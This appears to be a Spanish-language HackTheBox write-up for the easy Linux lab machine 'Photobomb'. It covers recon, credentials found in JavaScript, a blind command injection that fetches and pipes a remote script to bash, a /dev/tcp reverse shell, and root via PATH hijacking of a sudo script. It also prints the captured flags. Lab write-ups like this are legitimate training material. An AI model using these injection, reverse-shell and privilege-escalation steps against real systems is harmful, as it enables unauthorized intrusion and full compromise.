---
layout: post
title: "HackTheBox - Photobomb (easy)"
categories: hackthebox/machines/easy
---

<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/52e97c6ca888644478ddcadfcd9f8be5.png">
</p>

- Photobomb is an easy Linux machine where plaintext credentials are used to access an internal web application with a `Download` functionality that is vulnerable to a blind command injection. Once a foothold as the machine main user is established, a poorly configured shell script that references binaries without their full paths is leveraged to obtain escalated privileges, as it can be ran with `sudo`.

## PortScan

```bash
❯ catn ../nmap/targeted
# Nmap 7.94SVN scan initiated Sun Sep 29 12:39:55 2024 as: nmap -sCV -p22,80 -oN targeted 10.10.11.182
Nmap scan report for 10.10.11.182
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep 29 12:40:32 2024 -- 1 IP address (1 host up) scanned in 36.79 seconds
```

## Enumeración

- Agregamos el subdominio al `/etc/hosts`.

```bash
❯ echo "10.10.11.182 photobomb.htb" | sudo tee -a /etc/hosts
```

- Esta es la pagina web.

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/photobomb/1.png">
</p>

- Nos dicen que demos `click` en la parte morada y que las credenciales las encontraremos en nuestro paquete de inicio.

- Si damos `click` nos piden credenciales pero por el momento no tenemos ningunas.

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/photobomb/2.png">
</p>

- Si revisamos el código fuente en el archivo `Javascript` encontramos lo que parecen ser credenciales.

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/photobomb/3.png">
</p>

- Si las probamos nos deja conectarnos.

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/photobomb/4.png">
</p>

## Shell as wizard

- Ahora lo que vamos a hacer es interceptar con `Burpsuite` la petición al momento de dar `click` en el botón rojo para ver como viaja la petición.

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/photobomb/5.png">
</p>

- Después de probar varias inyecciones en la parte de `filetype` podemos concatenar un comando en esta ocasión me hago una petición a un script el cual por el momento no existe y me llega la petición.

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/photobomb/6.png">
</p>

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.182 - - [29/Sep/2024 13:14:05] code 404, message File not found
10.10.11.182 - - [29/Sep/2024 13:14:05] "GET /shell.sh HTTP/1.1" 404 -
```

- Sabiendo que podemos inyectar comandos vamos a crear el archivo para obtener una reverse Shell.

```bash
❯ cat shell.sh
───────┬──────────────────────────────────────────────────
       │ File: shell.sh
───────┼──────────────────────────────────────────────────
   1   │ #!/bin/bash
   2   │ 
   3   │ bash -i >& /dev/tcp/10.10.14.30/443 0>&1
───────┴──────────────────────────────────────────────────
```

- Ahora nos ponemos en escucha.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```

- Y simplemente enviamos la petición.

- Agregamos `| bash` para que lo interprete.

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/photobomb/7.png">
</p>

- Nos llega la Shell.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.30] from (UNKNOWN) [10.10.11.182] 43738
bash: cannot set terminal process group (697): Inappropriate ioctl for device
bash: no job control in this shell
wizard@photobomb:~/photobomb$ whoami
whoami
wizard
wizard@photobomb:~/photobomb$ 
```

- Ahora hacemos un tratamiento de la `tty`.

```bash
wizard@photobomb:~/photobomb$ script /dev/null -c bash
wizard@photobomb:~/photobomb$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo;fg
[1]  + continued  nc -nlvp 443
                              reset xterm
ENTER
```

## User flag

- Podemos ver la flag.

```bash
wizard@photobomb:~$ cat user.txt 
c2dd57cf27062d9098da457334b87181
wizard@photobomb:~$ 
```

## Escalada de Privilegios

- No vemos nada interesante.

```bash
wizard@photobomb:/$ find / -perm -4000 2>/dev/null
/usr/bin/gpasswd
/usr/bin/fusermount
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/at
/usr/bin/su
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/umount
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

- Podemos correr ese script como `root` sin proporcionar contraseñas y `setear` variables de entorno.

```bash
wizard@photobomb:/$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
wizard@photobomb:/$ 
```

- Con `find` esta buscando todos los archivos con extensión `".jpg"` en el directorio `"source_images"` y sus subdirectorios, y cambia el propietario y grupo de cada archivo encontrado a `"root:root"`.

```bash
wizard@photobomb:/$ cat /opt/cleanup.sh 
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

- Tenemos la capacidad de modificar variables como el `'path'` para utilizar un comando `'find'` personalizado. Además, si ejecutamos el comando `'find'` con privilegios de administrador, el `'find'` se ejecutará con permisos de `root`.

<center><iframe width="560" height="315" src="https://www.youtube.com/embed/Z3o0Y2kMoeU?si=Ifo5r-wcDUlddTBk" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe></center>

- Vamos a darnos una `bash`.

```bash
wizard@photobomb:~$ echo bash > find
wizard@photobomb:~$ chmod +x find
```

- Ahora modificamos el `path` temporalmente para dar prioridad al directorio actual.

```bash
wizard@photobomb:~$ sudo PATH=$PWD:$PATH /opt/cleanup.sh
root@photobomb:/home/wizard/photobomb# whoami
root
root@photobomb:/home/wizard/photobomb# 
```

## root flag

```bash
root@photobomb:/home/wizard/photobomb# cat /root/root.txt
b740fbec8fa61254b2467d424ac7aaaa
```
